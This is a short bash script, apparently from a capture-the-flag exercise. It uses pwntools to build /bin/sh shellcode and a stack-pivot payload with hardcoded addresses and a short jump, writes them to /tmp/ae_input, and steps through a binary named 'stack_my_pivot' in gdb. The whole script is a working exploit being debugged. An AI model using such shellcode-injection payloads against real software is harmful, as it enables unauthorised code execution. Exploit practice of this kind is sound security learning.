#!/bin/bash

python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')
second_input = b'\x90' * 8 + p64(0x400738) + b'\xeb\xae' + b'\x90' * 6 + p32(0x40072e)

with open('/tmp/ae_input', 'wb') as f:
    f.write(first_input + second_input)
EOF

gdb -batch \
  -ex 'break *0x400738' \
  -ex 'run < /tmp/ae_input' \
  -ex 'continue' \
  -ex 'info registers rsp rip rbp' \
  -ex 'x/20gx $rsp-0x60' \
  -ex 'x/20i $rsp' \
  -ex 'stepi' \
  -ex 'info registers rip rsp' \
  -ex 'x/10i $rip' \
  -ex 'continue' \
  ./stack_my_pivot 2>&1 | tail -80
